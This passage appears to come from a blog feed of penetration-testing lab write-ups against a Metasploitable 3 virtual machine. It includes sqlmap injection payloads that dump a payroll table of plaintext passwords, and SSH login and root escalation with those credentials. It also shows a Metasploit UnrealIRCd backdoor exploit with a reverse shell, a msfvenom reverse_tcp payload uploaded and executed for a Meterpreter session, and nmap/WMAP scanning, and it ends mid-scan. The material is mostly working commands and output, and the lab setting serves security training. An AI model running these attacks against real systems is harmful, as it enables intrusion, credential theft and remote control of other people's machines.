[INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [12:51:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [12:51:23] [INFO] \u0026#39;ORDER BY\u0026#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test [12:51:23] [INFO] target URL appears to have 4 columns in query [12:51:23] [INFO] POST parameter \u0026#39;user\u0026#39; is \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; injectable sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests: --- Parameter: user (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: user=CGYY\u0026#39; AND (SELECT 9858 FROM (SELECT(SLEEP(5)))lNho) AND \u0026#39;xRHP\u0026#39;=\u0026#39;xRHP\u0026amp;password=\u0026amp;s=OK Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: user=CGYY\u0026#39; UNION ALL SELECT CONCAT(0x717a707a71,0x6f5763664f6a6a4e714e636a4c52676d6f584a5a4f7371786c46504a4b69744c4d4975564474554b,0x71766a7071),NULL,NULL,NULL-- -\u0026amp;password=\u0026amp;s=OK --- do you want to exploit this SQL injection? [Y/n] Y [12:51:54] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Apache 2.4.7, PHP 5.4.5 back-end DBMS: MySQL \u0026gt;= 5.0.12 [12:51:54] [INFO] fetching database names available databases [5]: [*] drupal [*] information_schema [*] mysql [*] payroll [*] performance_schema [12:51:54] [INFO] you can find results of scanning in multiple targets mode inside the CSV file \u0026#39;/home/parrot/.local/share/sqlmap/output/results-03032024_1250pm.csv\u0026#39; [12:51:54] [WARNING] your sqlmap version is outdated [*] ending @ 12:51:54 /2024-03-03/ ┌─[parrot@parrot]─[~] └──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --forms --dump payroll ___ __H__ ___ ___[\u0026#34;]_____ ___ ___ {1.7.2#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [\u0026#34;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 12:52:58 /2024-03-03/ [12:52:58] [INFO] testing connection to the target URL [12:52:58] [INFO] searching for forms [1/1] Form: POST http://10.0.2.28/payroll_app.php POST data: user=\u0026amp;password=\u0026amp;s=OK do you want to test this form? [Y/n/q] \u0026gt; Y Edit POST data [default: user=\u0026amp;password=\u0026amp;s=OK] (Warning: blank fields detected): do you want to fill blank fields with random values? [Y/n] Y [12:53:34] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [12:53:34] [INFO] using \u0026#39;/home/parrot/.local/share/sqlmap/output/results-03032024_1253pm.csv\u0026#39; as the CSV results file in multiple targets mode sqlmap resumed the following injection point(s) from stored session: --- Parameter: user (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: user=CGYY\u0026#39; AND (SELECT 9858 FROM (SELECT(SLEEP(5)))lNho) AND \u0026#39;xRHP\u0026#39;=\u0026#39;xRHP\u0026amp;password=\u0026amp;s=OK Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: user=CGYY\u0026#39; UNION ALL SELECT CONCAT(0x717a707a71,0x6f5763664f6a6a4e714e636a4c52676d6f584a5a4f7371786c46504a4b69744c4d4975564474554b,0x71766a7071),NULL,NULL,NULL-- -\u0026amp;password=\u0026amp;s=OK --- do you want to exploit this SQL injection? [Y/n] Y [12:53:37] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: PHP 5.4.5, Apache 2.4.7 back-end DBMS: MySQL \u0026gt;= 5.0.12 [12:53:37] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [12:53:37] [INFO] fetching current database [12:53:37] [WARNING] reflective value(s) found and filtering out [12:53:37] [INFO] fetching tables for database: \u0026#39;payroll\u0026#39; [12:53:37] [INFO] fetching columns for table \u0026#39;users\u0026#39; in database \u0026#39;payroll\u0026#39; [12:53:37] [INFO] fetching entries for table \u0026#39;users\u0026#39; in database \u0026#39;payroll\u0026#39; Database: payroll Table: users [15 entries] +--------+-------------------------+------------------+------------+------------+ | salary | password | username | last_name | first_name | +--------+-------------------------+------------------+------------+------------+ | 9560 | help_me_obiwan | leia_organa | Organa | Leia | | 1080 | like_my_father_beforeme | luke_skywalker | Skywalker | Luke | | 1200 | nerf_herder | han_solo | Solo | Han | | 22222 | b00p_b33p | artoo_detoo | Detoo | Artoo | | 3200 | Pr0t0c07 | c_three_pio | Threepio | C | | 10000 | thats_no_m00n | ben_kenobi | Kenobi | Ben | | 6666 | Dark_syD3 | darth_vader | Vader | Darth | | 1025 | but_master:( | anakin_skywalker | Skywalker | Anakin | | 2048 | mesah_p@ssw0rd | jarjar_binks | Binks | Jar-Jar | | 40000 | @dm1n1str8r | lando_calrissian | Calrissian | Lando | | 20000 | mandalorian1 | boba_fett | Fett | Boba | | 65000 | my_kinda_skum | jabba_hutt | Hutt | Jaba | | 50000 | hanSh0tF1rst | greedo | Rodian | Greedo | | 4500 | rwaaaaawr8 | chewbacca | \u0026lt;blank\u0026gt; | Chewbacca | | 6667 | Daddy_Issues2 | kylo_ren | Ren | Kylo | +--------+-------------------------+------------------+------------+------------+ [12:53:37] [INFO] table \u0026#39;payroll.users\u0026#39; dumped to CSV file \u0026#39;/home/parrot/.local/share/sqlmap/output/10.0.2.28/dump/payroll/users.csv\u0026#39; [12:53:37] [INFO] you can find results of scanning in multiple targets mode inside the CSV file \u0026#39;/home/parrot/.local/share/sqlmap/output/results-03032024_1253pm.csv\u0026#39; [12:53:37] [WARNING] your sqlmap version is outdated [*] ending @ 12:53:37 /2024-03-03/ Connect using SSH. Select a username and password from the lists above\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ┌─[parrot@parrot]─[~] └──╼ $ssh leia_organa@10.0.3.6 The authenticity of host \u0026#39;10.0.3.6 (10.0.3.6)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:1: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.0.3.6\u0026#39; (ED25519) to the list of known hosts. leia_organa@10.0.3.6\u0026#39;s password: Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64) * Documentation: https://help.ubuntu.com/ New release \u0026#39;16.04.7 LTS\u0026#39; available. Run \u0026#39;do-release-upgrade\u0026#39; to upgrade to it. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. leia_organa@metasploitable3-ub1404:~$ uname -a Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux leia_organa@metasploitable3-ub1404:~$ sudo -s [sudo] password for leia_organa: root@metasploitable3-ub1404:~# Add new user\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@metasploitable3-ub1404:~# adduser abril Adding user `abril\u0026#39; ... Adding new group `abril\u0026#39; (1000) ... Adding new user `abril\u0026#39; (1000) with group `abril\u0026#39; ... Creating home directory `/home/abril\u0026#39; ... Copying files from `/etc/skel\u0026#39; ... Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully Changing the user information for abril Enter the new value, or press ENTER for the default Full Name []: abril jordan casinillo Room Number []: 47 Work Phone []: 123456789 Home Phone []: 123456789 Other []: 14344 Is the information correct? [Y/n] Y root@metasploitable3-ub1404:~# su - abril abril@metasploitable3-ub1404:~$ ","date":"2023-08-18T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/sql-injection-on-payroll-web-application/","title":"SQL Injection on Payroll Web Application"},{"content":"Target: Metasploitable 3 Linux Tool: Metasploit Vulnerability: UnrealIRCD 3.2.8.1 Backdoor Command Execution UnrealIRCD 3.2.8.1 Backdoor Command Execution\n\u0026ldquo;This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.\u0026rdquo;\nhttps://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use exploit/unix/irc/unreal_ircd_3281_backdoor [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; show options Module options (exploit/unix/irc/unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp loit.html RPORT 6667 yes The target port (TCP) Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; set RHOSTS 10.0.2.28 RHOSTS =\u0026gt; 10.0.2.28 [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; set RPORT 6697 RPORT =\u0026gt; 6697 [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 payload/cmd/unix/adduser normal No Add user with useradd 1 payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP (via Perl) 2 payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP (via perl) IPv6 3 payload/cmd/unix/bind_ruby normal No Unix Command Shell, Bind TCP (via Ruby) 4 payload/cmd/unix/bind_ruby_ipv6 normal No Unix Command Shell, Bind TCP (via Ruby) IPv6 5 payload/cmd/unix/generic normal No Unix Command, Generic Command Execution 6 payload/cmd/unix/reverse normal No Unix Command Shell, Double Reverse TCP (telnet) 7 payload/cmd/unix/reverse_bash_telnet_ssl normal No Unix Command Shell, Reverse TCP SSL (telnet) 8 payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP (via Perl) 9 payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL (via perl) 10 payload/cmd/unix/reverse_ruby normal No Unix Command Shell, Reverse TCP (via Ruby) 11 payload/cmd/unix/reverse_ruby_ssl normal No Unix Command Shell, Reverse TCP SSL (via Ruby) 12 payload/cmd/unix/reverse_ssl_double_telnet normal No Unix Command Shell, Double Reverse TCP SSL (telnet) [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; set payload payload/cmd/unix/reverse payload =\u0026gt; cmd/unix/reverse [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; show options Module options (exploit/unix/irc/unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.0.2.28 yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp loit.html RPORT 6697 yes The target port (TCP) Payload options (cmd/unix/reverse): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; set LHOST 10.0.2.16 LHOST =\u0026gt; 10.0.2.16 [msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) \u0026gt;\u0026gt; exploit [*] Started reverse TCP double handler on 10.0.2.16:4444 [*] 10.0.2.28:6697 - Connected to 10.0.2.28:6697... :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname... [*] 10.0.2.28:6697 - Sending backdoor command... [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo 1moozBPFDDMzGgYN; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket B [*] B: \u0026#34;1moozBPFDDMzGgYN\\r\\n\u0026#34; [*] Matching... [*] A is input... [*] Command shell session 1 opened (10.0.2.16:4444 -\u0026gt; 10.0.2.28:44915) at 2024-02-20 12:50:30 +0000 uname -a Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux ","date":"2023-07-18T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/unrealircd-3.2.8.1-backdoor-command-execution/","title":"UnrealIRCD 3.2.8.1 Backdoor Command Execution"},{"content":"Target: Metasploitable 3 Linux Tool: Metasploit Vulnerability: Reverse shell Reverse shell\nStep 1: We will first need to create a payload for our Metasploitable VM.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.16 LPORT=5555 -f elf -o reverse-sh.elf [*] exec: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.16 LPORT=5555 -f elf -o reverse-sh.elf Overriding user environment variable \u0026#39;OPENSSL_CONF\u0026#39; to enable legacy functions. [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 123 bytes Final size of elf file: 207 bytes Saved as: reverse-sh.elf [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; file reverse-sh.elf [*] exec: file reverse-sh.elf reverse-sh.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; Step 2: Place the payload file on the target machine using ftp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ┌─[parrot@parrot]─[~] └──╼ $ftp 10.0.2.28 Connected to 10.0.2.28. 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.2.28] Name (10.0.2.28:parrot): vagrant 331 Password required for vagrant Password: 230 User vagrant logged in Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; put reverse-sh.elf local: reverse-sh.elf remote: reverse-sh.elf 229 Entering Extended Passive Mode (|||3046|) ftp: Can\u0026#39;t connect to `10.0.2.28:3046\u0026#39;: Connection timed out 200 EPRT command successful 150 Opening BINARY mode data connection for reverse-sh.elf 100% |***********************************| 207 1.57 MiB/s 00:00 ETA 226 Transfer complete 207 bytes sent in 00:00 (29.30 KiB/s) Already connected to 10.0.2.28, use close first. ftp\u0026gt; ls 200 EPRT command successful 150 Opening ASCII mode data connection for file list -rw-r--r-- 1 vagrant vagrant 86562816 Oct 29 2020 VBoxGuestAdditions.iso -rw-r--r-- 1 vagrant vagrant 207 Feb 21 03:10 reverse-sh.elf 226 Transfer complete ftp\u0026gt; by 221 Goodbye. ┌─[parrot@parrot]─[~] └──╼ $ Step 3: Make this file executable on our Metasploitable VM.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌─[parrot@parrot]─[~] └──╼ $ssh vagrant@10.0.2.28 The authenticity of host \u0026#39;10.0.2.28 (10.0.2.28)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.0.2.28\u0026#39; (ED25519) to the list of known hosts. vagrant@10.0.2.28\u0026#39;s password: Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64) * Documentation: https://help.ubuntu.com/ Last login: Wed Feb 21 02:47:29 2024 vagrant@metasploitable3-ub1404:~$ chmod +x reverse-sh.elf vagrant@metasploitable3-ub1404:~$ ls -al reverse-sh.elf -rwxr-xr-x 1 vagrant vagrant 207 Feb 21 03:10 reverse-sh.elf Step 4: Open a new terminal. Establish the listener for the reverse connection which our payload will be sending to our machine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) \u0026gt;\u0026gt; set lhost 10.0.2.16 lhost =\u0026gt; 10.0.2.16 [msf](Jobs:0 Agents:0) exploit(multi/handler) \u0026gt;\u0026gt; set lport 5555 lport =\u0026gt; 5555 [msf](Jobs:0 Agents:0) exploit(multi/handler) \u0026gt;\u0026gt; set payload linux/x86/meterpreter/reverse_tcp payload =\u0026gt; linux/x86/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) \u0026gt;\u0026gt; run [*] Started reverse TCP handler on 10.0.2.16:5555 [*] Sending stage (1017704 bytes) to 10.0.2.28 [*] Meterpreter session 1 opened (10.0.2.16:5555 -\u0026gt; 10.0.2.28:43945) at 2024-02-21 03:19:30 +0000 Step 5: Execute the payload on our target. Navigate back to terminal screen with the established SSH connection. Then, type the following:\n1 vagrant@metasploitable3-ub1404:~$ ./reverse-sh.elf Step 6: Return to the terminal screen which is running the Metasploit listener. You will see a meterpreter session has started and is now open. We have sucessfully established a stable shell! We can access the shell by typing “shell” into meterpreter. We can return to the Meterpreter interface from the shell by typing “exit” into the shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 (Meterpreter 1)(/home/vagrant) \u0026gt; shell Process 1930 created. Channel 1 created. uname -a Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux whoami vagrant id uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) exit (Meterpreter 1)(/home/vagrant) \u0026gt; ","date":"2023-06-18T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/reverse-shell-msfvenom/","title":"Reverse shell - msfvenom"},{"content":"Target: Metasploitable 3 Linux Tools: Metasploit and Nmap Scan for existing vulnerabilities Nmap scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ┌─[parrot@parrot]─[~] └──╼ $nmap -oA 10.0.2.28 -sV -p- -Pn -n --version-all --open 10.0.2.28 Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-06 13:31 GMT Stats: 0:03:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 43.68% done; ETC: 13:39 (0:04:23 remaining) Nmap scan report for 10.0.2.28 Host is up (0.0038s latency). Not shown: 65524 filtered tcp ports (no-response), 3 closed tcp ports (conn-refused) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.7 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 631/tcp open ipp CUPS 1.7 3306/tcp open mysql MySQL (unauthorized) 6697/tcp open irc UnrealIRCd 8080/tcp open http Jetty 8.1.7.v20120910 Service Info: Hosts: 127.0.2.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 384.36 seconds Metasploit Load WMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; load wmap .-.-.-..-.-.-..---..---. | | | || | | || | || |-\u0026#39; `-----\u0026#39;`-\u0026#39;-\u0026#39;-\u0026#39;`-^-\u0026#39;`-\u0026#39; [WMAP 1.5.1] === et [ ] metasploit.com 2012 [*] Successfully loaded plugin: wmap [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; wmap_sites -a [-] No site provided. [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; wmap_sites [*] Usage: wmap_sites [options] -h Display this help text -a [url] Add site (vhost,url) -d [ids] Delete sites (separate ids with space) -l List all available sites -s [id] Display site structure (vhost,url|ids) (level) (unicode output true/false) Add Site to Scan 1 2 3 4 5 6 7 8 9 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; wmap_sites -a 10.0.2.28 [*] Site created. [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; wmap_sites -l [*] Available sites =============== Id Host Vhost Port Proto # Pages # Forms -- ---- ----- ---- ----- ------- ------- 0 10.0.2.28 10.0.2.28 80 http 0 0 Specify Target URL Set the specific target URL we want to scan using wmap_targets.\n1 2 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; wmap_targets -d 0 [*] Loading 10.0.2.28,http://10.0.2.28:80/. Run Scanner Type wmap_run at the prompt to view the options for this command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; wmap_run -t [*] Testing target: [*] Site: 10.0.2.28 (10.0.2.28) [*] Port: 80 SSL: false ============================================================ [*] Testing started. 2024-03-05 05:15:03 +0000 [*] Loading wmap modules... [*] 39 wmap enabled modules loaded. [*] =[ SSL testing ]= ============================================================ [*] Target is not SSL. SSL modules disabled. [*] =[ Web Server testing ]= ============================================================ [*] Module auxiliary/scanner/http/http_version [*] Module auxiliary/scanner/http/open_proxy [*] Module auxiliary/admin/http/tomcat_administration [*] Module auxiliary/admin/http/tomcat_utf8_traversal [*] Module auxiliary/scanner/http/drupal_views_user_enum [*] Module auxiliary/scanner/http/frontpage_login [*] Module auxiliary/scanner/http/host_header_injection [*] Module auxiliary/scanner/http/options [*] Module auxiliary/scanner/http/robots_txt [*] Module auxiliary/scanner/http/scraper [*] Module auxiliary/scanner/http/svn_scanner [*] Module auxiliary/scanner/http/trace [*] Module auxiliary/scanner/http/vhost_scanner [*] Module auxiliary/scanner/http/webdav_internal_ip [*] Module auxiliary/scanner/http/webdav_scanner [*] Module auxiliary/scanner/http/webdav_website_content [*] =[ File/Dir testing ]= ============================================================ [*] Module auxiliary/scanner/http/backup_file [*] Module auxiliary/scanner/http/brute_dirs [*] Module auxiliary/scanner/http/copy_of_file [*] Module auxiliary/scanner/http/dir_listing [*] Module auxiliary/scanner/http/dir_scanner [*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass [*] Module auxiliary/scanner/http/file_same_name_dir [*] Module auxiliary/scanner/http/files_dir [*] Module auxiliary/scanner/http/http_put [*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass [*] Module auxiliary/scanner/http/prev_dir_same_name_file [*] Module auxiliary/scanner/http/replace_ext [*] Module auxiliary/scanner/http/soap_xml [*] Module auxiliary/scanner/http/trace_axd [*] Module auxiliary/scanner/http/verb_auth_bypass [*] =[ Unique Query testing ]= ============================================================ [*] Module auxiliary/admin/vmware/vcenter_forge_saml_token [*] Module auxiliary/scanner/http/blind_sql_query [*] Module auxiliary/scanner/http/error_sql_injection [*] Module auxiliary/scanner/http/http_traversal [*] Module auxiliary/scanner/http/rails_mass_assignment [*] Module exploit/multi/http/lcms_php_exec [*] =[ Query testing ]= ============================================================ [*] =[ General testing ]= ============================================================ [*] Done. Scan by using wmap_run with the -e flag It will run all of the modules instead of just a specified one.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; wmap_run -e [*] Using ALL wmap enabled modules. [-] NO WMAP NODES DEFINED. Executing local modules [*] Testing target: [*] Site: 10.0.2.28 (10.0.2.28) [*] Port: 80 SSL: false ============================================================ [*] Testing started. 2024-03-05 05:17:53 +0000 [*] =[ SSL testing ]= ============================================================ [*] Target is not SSL. SSL modules disabled. [*] =[ Web Server testing ]= ============================================================ [*] Module auxiliary/scanner/http/http_version [+] 10.0.2.28:80 Apache/2.4.7 (Ubuntu) [*] Module auxiliary/scanner/http/open_proxy [*] Module auxiliary/admin/http/tomcat_administration [*] Module auxiliary/admin/http/tomcat_utf8_traversal [*] Attempting to connect to 10.0.2.28:80 [-] No File(s) found [*] Module auxiliary/scanner/http/drupal_views_user_enum [-] 10.0.2.28 does not appear to be vulnerable, will not continue [*] Module auxiliary/scanner/http/frontpage_login [*] 10.0.2.28:80 - http://10.0.2.28/ may not support FrontPage Server Extensions [*] Module auxiliary/scanner/http/host_header_injection [+] 10.0.2.28:80/ (10.0.2.28)(200)(GET)(evidence into body) is vulnerable to HTTP Host header injection [*] Module auxiliary/scanner/http/options [+] 10.0.2.28 allows GET,HEAD,POST,OPTIONS methods [*] Module auxiliary/scanner/http/robots_txt [*] Module auxiliary/scanner/http/scraper [+] [10.0.2.28] / [Index of /] [*] Module auxiliary/scanner/http/svn_scanner [*] Using code \u0026#39;404\u0026#39; as not found. [*] Module auxiliary/scanner/http/trace [*] Module auxiliary/scanner/http/vhost_scanner [*] [10.0.2.28] Sending request with random domain YnEnK. [*] [10.0.2.28] Sending request with random domain EILCC. [-] [10.0.2.28] Unable to identify error response [*] Module auxiliary/scanner/http/webdav_internal_ip [*] Module auxiliary/scanner/http/webdav_scanner [*] 10.0.2.28 (Apache/2.4.7 (Ubuntu)) WebDAV disabled. [*] Module auxiliary/scanner/http/webdav_website_content [*] =[ File/Dir testing ]= ============================================================ [*] Module auxiliary/scanner/http/backup_file [*] Module auxiliary/scanner/http/brute_dirs [*] Path: / [*] Using code \u0026#39;404\u0026#39; as not found. [*] Module auxiliary/scanner/http/copy_of_file [*] Module auxiliary/scanner/http/dir_listing [*] Path: / [+] Found Directory Listing http://10.0.2.28:80/ [*] Module auxiliary/scanner/http/dir_scanner [*] Path: / [*] Detecting error code [*] Using code \u0026#39;404\u0026#39; as not found for 10.0.2.28 [+] Found http://10.0.2.28:80/cgi-bin/ 403 (10.0.2.28) [+] Found http://10.0.2.28:80/chat/ 200 (10.0.2.28) [+] Found http://10.0.2.28:80/icons/ 403 (10.0.2.28) [+] Found http://10.0.2.28:80/phpmyadmin/ 200 (10.0.2.28) [+] Found http://10.0.2.28:80/uploads/ 200 (10.0.2.28) [*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass [*] Path: / [*] Using code \u0026#39;404\u0026#39; as not found. [*] Module auxiliary/scanner/http/file_same_name_dir [*] Path: / [-] Blank or default PATH set. [*] Module auxiliary/scanner/http/files_dir [*] Path: / [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .null [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .backup [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .bak [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .c [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .cfg [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .class [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .copy [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .conf [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .exe [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .html [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .htm [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .ini [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .log [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .old [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .orig [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .php [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .tar [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .tar.gz [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .tgz [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .tmp [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .temp [*] Using code \u0026#39;404\u0026#39; as not found for files with extension .txt [*] Using code 